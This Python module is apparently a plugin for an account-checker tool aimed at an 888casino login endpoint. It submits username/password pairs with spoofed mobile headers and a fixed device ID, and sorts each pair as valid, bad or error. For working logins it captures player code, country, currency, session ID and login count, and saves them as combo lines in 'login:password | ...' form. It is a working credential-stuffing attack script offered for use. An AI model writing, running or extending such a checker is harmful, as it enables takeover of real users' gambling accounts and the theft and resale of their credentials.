from core.base_checker import BaseChecker
from typing import Dict, Any
import requests

class Ar888GamesChecker(BaseChecker):
    """888Casino (ar888games2) site checker"""
    
    # الروابط الرئيسية
    LOGIN_URL = "https://login.ar888games2.com/LoginAndGetTempToken.php"
    
    # الهيدرات المطلوبة (نفس التي قدمتها في طلبك)
    HEADERS = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'origin': "https://login.ar888games2.com",
        'referer': "https://login.ar888games2.com/pasSetupPage.php?casino=888casino1.com",
        'accept-language': "en-US,en;q=0.9"
    }
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single 888Casino account"""
        try:
            session = requests.Session()
            session.headers.update(self.HEADERS)
            
            # 1. إعداد المعاملات (Params)
            params = {
                'casinoname': "888casino1.com",
                'realMode': "1",
                'serviceType': "GamePlay",
                'clientType': "casino",
                'clientPlatform': "mobile",
                'clientSkin': "888casino1.com",
                'deviceId': "8d38b1ba-d3a0-4c98-b6c4-d16146db2a30",
                'deliveryPlatform': "Hub2",
                'languageCode': "en",
                'errorLevel': "1",
                'messagesSupported': "1"
            }
            
            # 2. إعداد البيانات المرسلة (Payload)
            payload = {
                'username': username,
                'password': password,
                'responseType': 'json'
            }
            
            # 3. محاولة تسجيل الدخول
            response = session.post(
                self.LOGIN_URL, 
                params=params, 
                data=payload, 
                timeout=20
            )
            
            if response.status_code != 200:
                return {"status": "error", "username": username}
            
            data = response.json()
            
            # 4. التحقق من الاستجابة (بناءً على errorCode ووجود sessionToken)
            if data.get("errorCode") != 0 or "sessionToken" not in data:
                # التحقق إذا كان الخطأ بسبب بيانات الاعتماد
                return {"status": "bad", "username": username}
            
            # 5. استخراج البيانات (Capture) من الـ JSON الناجح الذي أرفقته
            session_info = data.get("sessionToken", {})
            
            account_data = {
                "login": username,
                "password": password,
                "player_code": data.get("playerCode", ""),
                "currency": data.get("currencyCode", "USD"),
                "country": data.get("ipCountryCode", ""),
                "real_mode": data.get("realMode", ""),
                "session_id": data.get("playerSessionId", ""),
                "login_count": data.get("ssoLoginCount", "0"),
                "expiry": session_info.get("expirationTime", {}).get("timestamp", "N/A"),
                "user_id": data.get("userId", "")
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """شرط الحفظ: مثلاً إذا كان الحساب قد سجل دخول مسبقاً أكثر من مرتين"""
        login_count = int(account_data.get("login_count", 0))
        return login_count > 0
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """تنسيق حفظ الحساب في الملف النهائي"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"Country={account_data['country']} | " \
               f"Currency={account_data['currency']} | " \
               f"Logins={account_data['login_count']} | " \
               f"PlayerCode={account_data['player_code']}\n"
